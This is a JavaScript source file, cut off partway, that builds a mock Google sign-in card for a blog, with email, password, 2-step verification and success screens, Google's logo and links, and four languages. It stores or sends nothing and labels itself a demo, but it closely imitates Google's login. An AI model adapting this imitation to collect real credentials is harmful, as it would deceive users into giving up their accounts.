/**
 * Google Sign-In Simulation UI & Component (Material 3)
 * 100% In-Card SPA Interaction (No browser reload / No browser tab spinner)
 * Pure Vanilla JavaScript - Zero External Dependencies
 */

(function (global) {
  'use strict';

  // --- SVG Icons ---
  const ICONS = {
    googleLogo: `<svg class="g-google-logo" viewBox="0 0 74 24" height="24" width="74" xmlns="http://www.w3.org/2000/svg">
      <path d="M9.24 10.87v3.25h7.59c-.31 1.76-2.06 5.16-7.59 5.16-4.57 0-8.3-3.77-8.3-8.41s3.73-8.41 8.3-8.41c2.6 0 4.34 1.11 5.34 2.06l2.58-2.48C15.52.48 12.63 0 9.24 0 4.13 0 0 4.18 0 9.47s4.13 9.47 9.24 9.47c5.34 0 8.89-3.76 8.89-9.05 0-.61-.07-1.07-.15-1.52H9.24z" fill="#4285F4"/>
      <path d="M25.71 9.47c0-3.08-2.41-5.32-5.46-5.32s-5.46 2.24-5.46 5.32c0 3.06 2.41 5.32 5.46 5.32s5.46-2.26 5.46-5.32zm-2.42 0c0 1.93-1.37 3.25-3.04 3.25s-3.04-1.32-3.04-3.25c0-1.95 1.37-3.25 3.04-3.25s3.04 1.3 3.04 3.25z" fill="#EA4335"/>
      <path d="M37.82 9.47c0-3.08-2.41-5.32-5.46-5.32s-5.46 2.24-5.46 5.32c0 3.06 2.41 5.32 5.46 5.32s5.46-2.26 5.46-5.32zm-2.42 0c0 1.93-1.37 3.25-3.04 3.25s-3.04-1.32-3.04-3.25c0-1.95 1.37-3.25 3.04-3.25s3.04 1.3 3.04 3.25z" fill="#FBBC05"/>
      <path d="M49.38 4.41h-2.31v1.07h-.08c-.46-.68-1.53-1.33-2.98-1.33-2.98 0-5.3 2.51-5.3 5.32 0 2.79 2.32 5.32 5.3 5.32 1.45 0 2.52-.65 2.98-1.35h.08v.83c0 2.03-1.09 3.12-2.84 3.12-1.43 0-2.32-1.03-2.68-1.89l-2.07.86c.6 1.45 2.18 3.1 4.75 3.1 2.76 0 5.1-1.63 5.1-5.54V4.41zm-5.06 8.31c-1.65 0-3-1.35-3-3.25 0-1.93 1.35-3.25 3-3.25 1.63 0 2.93 1.35 2.93 3.27 0 1.9-1.3 3.23-2.93 3.23z" fill="#4285F4"/>
      <path d="M54.12.5h2.42v14.29h-2.42z" fill="#34A853"/>
      <path d="M63.53 12.78c-1.28 0-2.18-.59-2.76-1.74l7.63-3.15-.26-.65c-.48-1.3-1.95-3.09-4.9-3.09-2.93 0-5.36 2.3-5.36 5.32 0 2.95 2.41 5.32 5.65 5.32 2.62 0 4.13-1.61 4.76-2.54l-1.95-1.3c-.65.96-1.54 1.83-2.81 1.83zm-.2-6.57c.98 0 1.81.5 2.09 1.22l-4.99 2.07c0-2.31 1.63-3.29 2.9-3.29z" fill="#EA4335"/>
    </svg>`,
    
    errorIcon: `<svg class="g-error-icon" viewBox="0 0 24 24" focusable="false"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>`,
    
    chevronDown: `<svg class="g-account-chevron" viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>`,
    
    eyeVisible: `<svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>`,
    
    eyeHidden: `<svg viewBox="0 0 24 24"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>`,

    checkSuccess: `<svg class="g-success-icon" viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>`,

    closeIcon: `<svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>`,

    devicePhone: `<svg class="g-2fa-device-icon" viewBox="0 0 48 48" fill="none">
      <rect x="14" y="6" width="20" height="36" rx="4" stroke="#0B57D0" stroke-width="2.5" fill="#E8F0FE"/>
      <circle cx="24" cy="36" r="1.5" fill="#0B57D0"/>
      <line x1="20" y1="10" x2="28" y2="10" stroke="#0B57D0" stroke-width="2" stroke-linecap="round"/>
      <path d="M21 22l2 2 4-4" stroke="#137333" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>`
  };

  // --- Multi-language Translations ---
  const I18N = {
    'zh-CN': {
      signIn: '登录',
      continueTo: '前往',
      useGoogleAccount: '使用您的 Google 帐号',
      emailOrPhone: '电子邮件地址或电话号码',
      forgotEmail: '忘记了电子邮件地址？',
      guestModeTip: '不是您的电脑？请使用无痕浏览窗口私密登录。',
      learnMore: '了解详情',
      createAccount: '创建帐号',
      next: '下一步',
      welcome: '欢迎',
      enterPassword: '输入您的密码',
      showPassword: '显示密码',
      forgotPassword: '忘记了密码？',
      twoStepVerification: '两步验证',
      twoStepSubtitle: '为了保护您的帐号，Google 想要确认确实是您本人在尝试登录',
      twoStepPhonePrompt: '请在已登录的手机上点按“是”，并确认匹配数字：',
      twoStepDoneBtn: '已在手机上确认',
      twoStepTryAnother: '尝试其他验证方式',
      loginSuccessTitle: '授权登录成功',
      loginSuccessDesc: '已成功连接您的 Google 帐号到博客',
      continueToBlog: '进入博客',
      switchAccount: '切换帐号',
      errorEmptyEmail: '输入有效的电子邮件地址或电话号码',
      errorInvalidEmail: '找不到您的 Google 帐号',
      errorEmptyPassword: '请输入密码',
      errorWrongPassword: '密码错误。请重试或点击“忘记了密码”重置。',
      help: '帮助',
      privacy: '隐私权',
      terms: '条款'
    },
    'zh-TW': {
      signIn: '登入',
      continueTo: '前往',
      useGoogleAccount: '使用您的 Google 帳戶',
      emailOrPhone: '電子郵件地址或電話號碼',
      forgotEmail: '忘記電子郵件地址？',
      guestModeTip: '這不是你的電腦嗎？請使用訪客模式私密登入。',
      learnMore: '瞭解詳情',
      createAccount: '建立帳戶',
      next: '繼續',
      welcome: '歡迎',
      enterPassword: '輸入密碼',
      showPassword: '顯示密碼',
      forgotPassword: '忘記密碼？',
      twoStepVerification: '兩步驟驗證',
      twoStepSubtitle: '為了保護您的帳戶，Google 想要確認確實是您本人在嘗試登入',
      twoStepPhonePrompt: '請在已登入的手機上輕觸「是」，並確認相符數字：',
      twoStepDoneBtn: '已在手機上確認',
      twoStepTryAnother: '嘗試其他驗證方式',
      loginSuccessTitle: '授權登入成功',
      loginSuccessDesc: '已成功連結您的 Google 帳戶',
      continueToBlog: '進入部落格',
      switchAccount: '切換帳戶',
      errorEmptyEmail: '輸入有效的電子郵件地址或電話號碼',
      errorInvalidEmail: '找不到您的 Google 帳戶',
      errorEmptyPassword: '請輸入密碼',
      errorWrongPassword: '密碼錯誤。請再試一次，或按一下「忘記密碼」以重設。',
      help: '說明',
      privacy: '隱私權',
      terms: '條款'
    },
    'en': {
      signIn: 'Sign in',
      continueTo: 'to continue to',
      useGoogleAccount: 'Use your Google Account',
      emailOrPhone: 'Email or phone',
      forgotEmail: 'Forgot email?',
      guestModeTip: 'Not your computer? Use Guest mode to sign in privately.',
      learnMore: 'Learn more',
      createAccount: 'Create account',
      next: 'Next',
      welcome: 'Welcome',
      enterPassword: 'Enter your password',
      showPassword: 'Show password',
      forgotPassword: 'Forgot password?',
      twoStepVerification: '2-Step Verification',
      twoStepSubtitle: 'To help keep your account safe, Google wants to make sure it\'s really you trying to sign in',
      twoStepPhonePrompt: 'Check your phone and tap Yes on the prompt, then match the number:',
      twoStepDoneBtn: 'Yes, it\'s me',
      twoStepTryAnother: 'Try another way',
      loginSuccessTitle: 'Successfully Signed In',
      loginSuccessDesc: 'Your Google Account has been connected to the blog.',
      continueToBlog: 'Continue to Blog',
      switchAccount: 'Switch account',
      errorEmptyEmail: 'Enter an email or phone number',
      errorInvalidEmail: 'Couldn\'t find your Google Account',
      errorEmptyPassword: 'Enter a password',
      errorWrongPassword: 'Wrong password. Try again or click Forgot password to reset it.',
      help: 'Help',
      privacy: 'Privacy',
      terms: 'Terms'
    },
    'ja': {
      signIn: 'ログイン',
      continueTo: '移動先:',
      useGoogleAccount: 'Google アカウントを使用',
      emailOrPhone: 'メールアドレスまたは電話番号',
      forgotEmail: 'メールアドレスを忘れた場合',
      guestModeTip: 'ご自分のパソコンでない場合は、ゲストモードを使用してプライベート ブラウジングを行ってください。',
      learnMore: '詳細',
      createAccount: 'アカウントを作成',
      next: '次へ',
      welcome: 'ようこそ',
      enterPassword: 'パスワードを入力',
      showPassword: 'パスワードを表示',
      forgotPassword: 'パスワードをお忘れの場合',
      twoStepVerification: '2 段階認証プロセス',
      twoStepSubtitle: 'アカウントを保護するため、ログインしようとしているのがご自身であることを確認してください',
      twoStepPhonePrompt: '端末でメッセージを確認し、表示された番号をタップしてください:',
      twoStepDoneBtn: '本人確認が完了しました',
      twoStepTryAnother: '別の方法を試す',
      loginSuccessTitle: 'ログインしました',
      loginSuccessDesc: 'Google アカウントがブログに接続されました。',
      continueToBlog: 'ブログへ移動',
      switchAccount: 'アカウントを切り替える',
      errorEmptyEmail: 'メールアドレスまたは電話番号を入力してください',
      errorInvalidEmail: 'Google アカウントが見つかりませんでした',
      errorEmptyPassword: 'パスワードを入力してください',
      errorWrongPassword: 'パスワードが間違っています。もう一度お試しになるか、[パスワードをお忘れの場合] をクリックしてください。',
      help: 'ヘルプ',
      privacy: 'プライバシー',
      terms: '規約'
    }
  };

  /**
   * GoogleLoginComponent Class
   */
  class GoogleLoginComponent {
    constructor(options = {}) {
      this.options = Object.assign({
        blogName: 'My Blog',
        blogUrl: window.location.origin,
        theme: 'auto',       // 'light' | 'dark' | 'auto'
        lang: 'zh-CN',        // 'zh-CN' | 'zh-TW' | 'en' | 'ja'
        mode: 'card',         // 'card' | 'modal'
        enable2FA: true,      // Simulate authentic Google 2-Step verification
        autoFocus: true,
        mockDelay: 600,       // Loading bar delay in ms
        onSuccess: null,
        onCancel: null,
        onError: null
      }, options);

      this.currentStep = 1; // 1: Email, 2: Password, 2.5: 2FA, 3: Success
      this.twoFactorCode = Math.floor(10 + Math.random() * 89); // e.g. 73
      this.userData = {
        email: '',
        name: '',
        avatar: '',
        token: ''
      };

      this.dom = {};
      this.isPasswordVisible = false;
      this.init();
    }

    t(key) {
      const dict = I18N[this.options.lang] || I18N['zh-CN'];
      return dict[key] || I18N['zh-CN'][key] || key;
    }

    init() {
      this.render();
      this.bindEvents();
      if (this.options.autoFocus && this.dom.emailInput) {
        setTimeout(() => this.dom.emailInput.focus(), 150);
      }
    }

    render() {
      const { blogName, mode, theme, lang } = this.options;
      const isDark = theme === 'dark' || (theme === 'auto' && window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches);

      const html = `
        <div class="google-login-container ${isDark ? 'dark-theme' : ''}" data-theme="${isDark ? 'dark' : 'light'}">
          <div class="google-login-card" id="g-card-box">
            <!-- Google Material 3 Indeterminate Linear Progress Bar (In-Card Loading) -->
            <div class="g-progress-bar" id="g-progress-bar" role="progressbar" aria-label="Loading">
              <div class="g-progress-line-1"></div>
              <div class="g-progress-line-2"></div>
            </div>

            ${mode === 'modal' ? `
              <button type="button" class="g-modal-close-btn" id="g-modal-close" aria-label="Close">
                ${ICONS.closeIcon}
              </button>
            ` : ''}

            <!-- Header -->
            <div class="g-header">
              <div class="g-logo-row">
                ${ICONS.googleLogo}
                <div class="g-blog-badge">
                  <span class="g-blog-badge-dot"></span>
                  <span class="g-blog-name-label">${this.escapeHtml(blogName)}</span>
                </div>
              </div>
              <h1 class="g-title" id="g-header-title">${this.t('signIn')}</h1>
              <p class="g-subtitle" id="g-header-subtitle">
                ${this.t('continueTo')} <span class="g-blog-target-name">${this.escapeHtml(blogName)}</span>
              </p>

              <!-- Account Chip (Visible on Password & 2FA steps) -->
              <div class="g-account-chip" id="g-account-chip" style="display: none;" title="${this.t('switchAccount')}">
                <div class="g-account-avatar" id="g-account-avatar">G</div>
                <span class="g-account-email" id="g-account-email-chip">user@example.com</span>
                ${ICONS.chevronDown}
              </div>
            </div>

            <!-- Single Page Form (Guaranteed 0% Page Reload) -->
            <form class="g-form" id="g-form-main" onsubmit="return false;" novalidate>
              <div class="g-step-container">
                
                <!-- STEP 1: Email / Phone Input -->
                <div class="g-step active" id="g-step-1">
                  <div class="g-input-group">
                    <div class="g-textfield" id="g-email-textfield">
                      <input type="text" class="g-input" id="g-input-email" autocomplete="username" placeholder=" " />
                      <label class="g-label" for="g-input-email">${this.t('emailOrPhone')}</label>
                    </div>
                    <div class="g-error-msg" id="g-email-error">
                      ${ICONS.errorIcon}
                      <span id="g-email-error-text">${this.t('errorEmptyEmail')}</span>
                    </div>
                  </div>

                  <div class="g-link-row">
                    <a href="javascript:void(0)" class="g-link" id="g-forgot-email">${this.t('forgotEmail')}</a>
                  </div>

                  <div class="g-info-text">
                    ${this.t('guestModeTip')}
                    <a href="https://support.google.com/chrome/answer/6130773" target="_blank" rel="noopener noreferrer">${this.t('learnMore')}</a>
                  </div>

                  <div class="g-actions-row">
                    <button type="button" class="g-btn-text" id="g-btn-create">${this.t('createAccount')}</button>
                    <button type="submit" class="g-btn-primary" id="g-btn-email-next">
                      <span class="g-btn-text-inner">${this.t('next')}</span>
                    </button>
                  </div>
                </div>

                <!-- STEP 2: Password Input -->
                <div class="g-step" id="g-step-2">
                  <div class="g-input-group">
                    <div class="g-textfield" id="g-password-textfield">
                      <input type="password" class="g-input" id="g-input-password" autocomplete="current-password" placeholder=" " />
                      <label class="g-label" for="g-input-password">${this.t('enterPassword')}</label>
                      <button type="button" class="g-password-toggle" id="g-pwd-toggle-btn" aria-label="Toggle password visibility">
                        ${ICONS.eyeVisible}
                      </button>
                    </div>
                    <div class="g-error-msg" id="g-password-error">
                      ${ICONS.errorIcon}
                      <span id="g-password-error-text">${this.t('errorEmptyPassword')}</span>
                    </div>
                  </div>

                  <label class="g-checkbox-row">
                    <input type="checkbox" class="g-checkbox" id="g-show-password-check" />
                    <span class="g-checkbox-label">${this.t('showPassword')}</span>
                  </label>

                  <div class="g-actions-row">
                    <a href="javascript:void(0)" class="g-link" id="g-forgot-password">${this.t('forgotPassword')}</a>
                    <button type="submit" class="g-btn-primary" id="g-btn-password-next">
                      <span class="g-btn-text-inner">${this.t('next')}</span>
                    </button>
                  </div>
                </div>

                <!-- STEP 2.5: 2-Step Verification (2FA) -->
                <div class="g-step" id="g-step-2fa">
                  <div class="g-2fa-container">
                    ${ICONS.devicePhone}
                    <p style="font-size: 14px; color: var(--g-text-secondary); line-height: 1.4; margin: 0 0 12px 0;">
                      ${this.t('twoStepPhonePrompt')}
                    </p>
                    <div class="g-2fa-code-box" id="g-2fa-code-num">${this.twoFactorCode}</div>
                    <div class="g-2fa-options">${this.t('twoStepTryAnother')}</div>
                  </div>

                  <div class="g-actions-row" style="justify-content: flex-end;">
                    <button type="button" class="g-btn-primary" id="g-btn-2fa-next">
                      <span class="g-btn-text-inner">${this.t('twoStepDoneBtn')}</span>
                    </button>
                  </div>
                </div>

                <!-- STEP 3: Success State -->
                <div class="g-step" id="g-step-3">
                  <div class="g-success-content">
                    <div class="g-success-icon-wrap">
                      ${ICONS.checkSuccess}
                    </div>
                    <h2 style="font-size: 20px; font-weight: 500; margin: 0 0 6px 0; color: var(--g-text-primary);">
                      ${this.t('loginSuccessTitle')}
                    </h2>
                    <p style="font-size: 14px; color: var(--g-text-secondary); margin: 0;">
                      ${this.t('loginSuccessDesc')}
                    </p>

                    <div class="g-user-info-card">
                      <div class="g-user-avatar-lg" id="g-success-avatar">G</div>
                      <div class="g-user-meta">
                        <div class="g-user-name" id="g-success-name">Google User</div>
                        <div class="g-user-email-text" id="g-success-email">user@gmail.com</div>
                      </div>
                    </div>
                  </div>

                  <div class="g-actions-row" style="justify-content: flex-end;">
                    <button type="button" class="g-btn-primary" id="g-btn-continue-blog" style="width: 100%;">
                      <span>${this.t('continueToBlog')}</span>
                    </button>
                  </div>
                </div>

              </div>
            </form>
          </div>

          <!-- Footer -->
          <div class="g-footer">
            <select class="g-lang-select" id="g-lang-select" aria-label="Language selector">
              <option value="zh-CN" ${lang === 'zh-CN' ? 'selected' : ''}>中文 (简体)</option>
              <option value="zh-TW" ${lang === 'zh-TW' ? 'selected' : ''}>中文 (繁體)</option>
              <option value="en" ${lang === 'en' ? 'selected' : ''}>English (United States)</option>
              <option value="ja" ${lang === 'ja' ? 'selected' : ''}>日本語</option>
            </select>
            <div class="g-footer-links">
              <a href="https://support.google.com/accounts?hl=${lang}" target="_blank" rel="noopener noreferrer" class="g-footer-link">${this.t('help')}</a>
              <a href="https://policies.google.com/privacy?hl=${lang}" target="_blank" rel="noopener noreferrer" class="g-footer-link">${this.t('privacy')}</a>
              <a href="https://policies.google.com/terms?hl=${lang}" target="_blank" rel="noopener noreferrer" class="g-footer-link">${this.t('terms')}</a>
            </div>
          </div>
        </div>
      `;

      this.element = document.createElement('div');
      this.element.className = 'google-login-wrapper';
      this.element.innerHTML = html.trim();

      // Query Elements
      this.dom = {
        cardBox: this.element.querySelector('#g-card-box'),
        progressBar: this.element.querySelector('#g-progress-bar'),
        modalClose: this.element.querySelector('#g-modal-close'),
        mainForm: this.element.querySelector('#g-form-main'),
        headerTitle: this.element.querySelector('#g-header-title'),
        headerSubtitle: this.element.querySelector('#g-header-subtitle'),
        accountChip: this.element.querySelector('#g-account-chip'),
        accountAvatar: this.element.querySelector('#g-account-avatar'),
        accountEmailChip: this.element.querySelector('#g-account-email-chip'),
        
        // Steps
        step1: this.element.querySelector('#g-step-1'),
        step2: this.element.querySelector('#g-step-2'),
        step2fa: this.element.querySelector('#g-step-2fa'),
        step3: this.element.querySelector('#g-step-3'),

        // Step 1
        emailInput: this.element.querySelector('#g-input-email'),
        emailTextfield: this.element.querySelector('#g-email-textfield'),
        emailError: this.element.querySelector('#g-email-error'),
        emailErrorText: this.element.querySelector('#g-email-error-text'),
        emailNextBtn: this.element.querySelector('#g-btn-email-next'),
        forgotEmailBtn: this.element.querySelector('#g-forgot-email'),
        createAccountBtn: this.element.querySelector('#g-btn-create'),

        // Step 2
        passwordInput: this.element.querySelector('#g-input-password'),
        passwordTextfield: this.element.querySelector('#g-password-textfield'),
        passwordError: this.element.querySelector('#g-password-error'),
        passwordErrorText: this.element.querySelector('#g-password-error-text'),
        passwordNextBtn: this.element.querySelector('#g-btn-password-next'),
        showPasswordCheck: this.element.querySelector('#g-show-password-check'),
        pwdToggleBtn: this.element.querySelector('#g-pwd-toggle-btn'),
        forgotPasswordBtn: this.element.querySelector('#g-forgot-password'),

        // Step 2.5
        btn2faNext: this.element.querySelector('#g-btn-2fa-next'),
        code2faNum: this.element.querySelector('#g-2fa-code-num'),

        // Step 3
        successAvatar: this.element.querySelector('#g-success-avatar'),
        successName: this.element.querySelector('#g-success-name'),
        successEmail: this.element.querySelector('#g-success-email'),
        continueBlogBtn: this.element.querySelector('#g-btn-continue-blog'),

        // Footer
        langSelect: this.element.querySelector('#g-lang-select')
      };
    }

    bindEvents() {
      // Prevent ANY browser form submission
      this.dom.mainForm.addEventListener('submit', (e) => {
        e.preventDefault();
        e.stopPropagation();
        if (this.currentStep === 1) {
          this.handleEmailSubmit();
        } else if (this.currentStep === 2) {
          this.handlePasswordSubmit();
        }
      });

      // Email input live validation
      this.dom.emailInput.addEventListener('input', () => {
        this.clearEmailError();
        this.toggleHasValue(this.dom.emailTextfield, this.dom.emailInput.value);
      });

      this.dom.emailNextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        this.handleEmailSubmit();
      });

      // Account chip click -> switch smoothly back to Step 1
      this.dom.accountChip.addEventListener('click', (e) => {
        e.preventDefault();
        this.goToStep(1, true);
      });

      // Password input live validation
      this.dom.passwordInput.addEventListener('input', () => {
        this.clearPasswordError();
        this.toggleHasValue(this.dom.passwordTextfield, this.dom.passwordInput.value);
      });

      this.dom.passwordNextBtn.addEventListener('click', (e) => {
        e.preventDefault();
        this.handlePasswordSubmit();
      });

      // Toggle password visibility
      this.dom.pwdToggleBtn.addEventListener('click', (e) => {
        e.preventDefault();
        this.togglePasswordVisibility();
      });

      this.dom.showPasswordCheck.addEventListener('change', (e) => {
        this.setPasswordVisibility(e.target.checked);
      });

      // Step 2FA Confirmation
      if (this.dom.btn2faNext) {
        this.dom.btn2faNext.addEventListener('click', (e) => {
          e.preventDefault();
          this.handle2FASubmit();
        });
      }

      // Language Switcher
      this.dom.langSelect.addEventListener('change', (e) => {
        this.setLanguage(e.target.value);
      });

      // Step 3 Continue Button
      this.dom.continueBlogBtn.addEventListener('click', (e) => {
        e.preventDefault();
        this.completeLogin();
      });

      // Mock Link Actions
      this.dom.forgotEmailBtn.addEventListener('click', (e) => {
        e.preventDefault();
        this.showEmailError('模拟演示：请输入您常用的任意邮箱地址');
      });

      this.dom.forgotPasswordBtn.addEventListener('click', (e) => {
        e.preventDefault();
        this.showPasswordError('模拟演示：输入任意 4 位以上字符即可');
      });

      this.dom.createAccountBtn.addEventListener('click', (e) => {
        e.preventDefault();
        alert('博客提示：在此演示中，输入任何格式正确的邮箱即可完成模拟登录！');
      });

      // Modal Close button
      if (this.dom.modalClose) {
        this.dom.modalClose.addEventListener('click', (e) => {
          e.preventDefault();
          if (typeof this.options.onCancel === 'function') {
            this.options.onCancel();
          }
        });
      }
    }

    toggleHasValue(fieldEl, value) {
      if (value && value.trim().length > 0) {
        fieldEl.classList.add('has-value');
      } else {
        fieldEl.classList.remove('has-value');
      }
    }

    // Google In-Card Linear Progress Loading Bar
    startInCardLoading() {
      this.dom.progressBar.classList.add('active');
      this.dom.cardBox.classList.add('is-loading');
    }

    stopInCardLoading() {
      this.dom.progressBar.classList.remove('active');
      this.dom.cardBox.classList.remove('is-loading');
    }

    // Step 1: Email Validation & In-Card Loading Transition
    handleEmailSubmit() {
      const email = this.dom.emailInput.value.trim();

      if (!email) {
        this.showEmailError(this.t('errorEmptyEmail'));
        this.dom.emailInput.focus();
        return;
      }

      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      const phoneRegex = /^1[3-9]\d{9}$/;
      const isSimpleUsername = /^[a-zA-Z0-9._-]{3,}$/.test(email);

      let formattedEmail = email;
      if (isSimpleUsername && !email.includes('@')) {
        formattedEmail = `${email}@gmail.com`;
      } else if (!emailRegex.test(email) && !phoneRegex.test(email)) {
        this.showEmailError(this.t('errorInvalidEmail'));
        this.dom.emailInput.focus();
        return;
      }

      // Trigger In-Card Loading Bar
      this.startInCardLoading();

      setTimeout(() => {
        this.stopInCardLoading();
        this.userData.email = formattedEmail;
        this.userData.name = formattedEmail.split('@')[0];
        
        // Setup Step 2 UI
        const firstLetter = this.userData.name.charAt(0).toUpperCase();
        this.dom.accountAvatar.textContent = firstLetter;
        this.dom.accountEmailChip.textContent = this.userData.email;

        this.goToStep(2);
      }, this.options.mockDelay);
    }

    showEmailError(msg) {
      this.dom.emailTextfield.classList.add('is-error');
      this.dom.emailErrorText.textContent = msg;
      this.dom.emailError.classList.add('visible');
    }

    clearEmailError() {
      this.dom.emailTextfield.classList.remove('is-error');
      this.dom.emailError.classList.remove('visible');
    }

    // Step 2: Password Validation & In-Card Transition
    handlePasswordSubmit() {
      const password = this.dom.passwordInput.value;

      if (!password) {
        this.showPasswordError(this.t('errorEmptyPassword'));
        this.dom.passwordInput.focus();
        return;
      }

      if (password.length < 4) {
        this.showPasswordError(this.t('errorWrongPassword'));
        this.dom.passwordInput.focus();
        return;
      }

      // Trigger In-Card Loading Bar
      this.startInCardLoading();

      setTimeout(() => {
        this.stopInCardLoading();
        this.userData.token = 'g_token_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
        this.userData.avatar = `https://api.dicebear.com/7.x/bottts/svg?seed=${encodeURIComponent(this.userData.email)}`;

        if (this.options.enable2FA) {
          // Proceed to 2FA Step
          this.twoFactorCode = Math.floor(10 + Math.random() * 89);
          if (this.dom.code2faNum) this.dom.code2faNum.textContent = this.twoFactorCode;
          this.goToStep(2.5);
        } else {
          // Direct Success
          this.setupSuccessUI();
          this.goToStep(3);
        }
      }, this.options.mockDelay + 100);
    }

    handle2FASubmit() {
      this.startInCardLoading();
      setTimeout(() => {
        this.stopInCardLoading();
        this.setupSuccessUI();
        this.goToStep(3);
      }, this.options.mockDelay);
    }

    setupSuccessUI() {
      const firstLetter = this.userData.name.charAt(0).toUpperCase();
      this.dom.successAvatar.textContent = firstLetter;
      this.dom.successName.textContent = this.userData.name;
      this.dom.successEmail.textContent = this.userData.email;
    }

    showPasswordError(msg) {
      this.dom.passwordTextfield.classList.add('is-error');
      this.dom.passwordErrorText.textContent = msg;
      this.dom.passwordError.classList.add('visible');
    }

    clearPasswordError() {
      this.dom.passwordTextfield.classList.remove('is-error');
      this.dom.passwordError.classList.remove('visible');
    }

    togglePasswordVisibility() {
      this.setPasswordVisibility(!this.isPasswordVisible);
    }

    setPasswordVisibility(visible) {
      this.isPasswordVisible = visible;
      this.dom.passwordInput.type = visible ? 'text' : 'password';
      this.dom.pwdToggleBtn.innerHTML = visible ? ICONS.eyeHidden : ICONS.eyeVisible;
      this.dom.showPasswordCheck.checked = visible;
    }

    // Step Navigation (Smooth In-Card Slide Transition)
    goToStep(stepNumber, isBack = false) {
      this.currentStep = stepNumber;

      const allSteps = [this.dom.step1, this.dom.step2, this.dom.step2fa, this.dom.step3];
      allSteps.forEach(step => {
        if (step) {
          step.classList.remove('active', 'slide-back');
        }
      });

      if (stepNumber === 1) {
        this.dom.step1.classList.add('active');
        if (isBack) this.dom.step1.classList.add('slide-back');
        this.dom.headerTitle.textContent = this.t('signIn');
        this.dom.headerSubtitle.style.display = 'block';
        this.dom.accountChip.style.display = 'none';
        setTimeout(() => this.dom.emailInput.focus(), 150);
      } else if (stepNumber === 2) {
        this.dom.step2.classList.add('active');
        if (isBack) this.dom.step2.classList.add('slide-back');
        this.dom.headerTitle.textContent = this.t('welcome');
        this.dom.headerSubtitle.style.display = 'none';
        this.dom.accountChip.style.display = 'inline-flex';
        this.dom.passwordInput.value = '';
        this.toggleHasValue(this.dom.passwordTextfield, '');
        this.clearPasswordError();
        setTimeout(() => this.dom.passwordInput.focus(), 150);
      } else if (stepNumber === 2.5) {
        this.dom.step2fa.classList.add('active');
        this.dom.headerTitle.textContent = this.t('twoStepVerification');
        this.dom.headerSubtitle.style.display = 'none';
        this.dom.accountChip.style.display = 'inline-flex';
      } else if (stepNumber === 3) {
        this.dom.step3.classList.add('active');
        this.dom.headerTitle.textContent = this.t('signIn');
        this.dom.headerSubtitle.style.display = 'block';
        this.dom.accountChip.style.display = 'none';
      }
    }

    setLanguage(lang) {
      if (!I18N[lang]) return;
      this.options.lang = lang;
      
      // Update DOM labels dynamically
      this.dom.headerSubtitle.innerHTML = `${this.t('continueTo')} <span class="g-blog-target-name">${this.escapeHtml(this.options.blogName)}</span>`;
      
      const emailLabel = this.element.querySelector('.g-label[for="g-input-email"]');
      if (emailLabel) emailLabel.textContent = this.t('emailOrPhone');
      if (this.dom.forgotEmailBtn) this.dom.forgotEmailBtn.textContent = this.t('forgotEmail');
      if (this.dom.createAccountBtn) this.dom.createAccountBtn.textContent = this.t('createAccount');
      if (this.dom.emailNextBtn) {
        const btnInner = this.dom.emailNextBtn.querySelector('.g-btn-text-inner');
        if (btnInner) btnInner.textContent = this.t('next');
      }
      
      const pwdLabel = this.element.querySelector('.g-label[for="g-input-password"]');
      if (pwdLabel) pwdLabel.textContent = this.t('enterPassword');
      const checkLabel = this.element.querySelector('.g-checkbox-label');
      if (checkLabel) checkLabel.textContent = this.t('showPassword');
      if (this.dom.forgotPasswordBtn) this.dom.forgotPasswordBtn.textContent = this.t('forgotPassword');
      if (this.dom.passwordNextBtn) {
        const btnInner = this.dom.passwordNextBtn.querySelector('.g-btn-text-inner');
        if (btnInner) btnInner.textContent = this.t('next');
      }
      if (this.dom.btn2faNext) {
        const btnInner = this.dom.btn2faNext.querySelector('.g-btn-text-inner');
        if (btnInner) btnInner.textContent = this.t('twoStepDoneBtn');
      }
      if (this.dom.continueBlogBtn) {
        const btnSpan = this.dom.continueBlogBtn.querySelector('span');
        if (btnSpan) btnSpan.textContent = this.t('continueToBlog');
      }

      if (this.currentStep === 1) {
        this.dom.headerTitle.textContent = this.t('signIn');
      } else if (this.currentStep === 2) {
        this.dom.headerTitle.textContent = this.t('welcome');
      } else if (this.currentStep === 2.5) {
        this.dom.headerTitle.textContent = this.t('twoStepVerification');
      }

      this.dom.langSelect.value = lang;
    }

    setTheme(theme) {
      this.options.theme = theme;
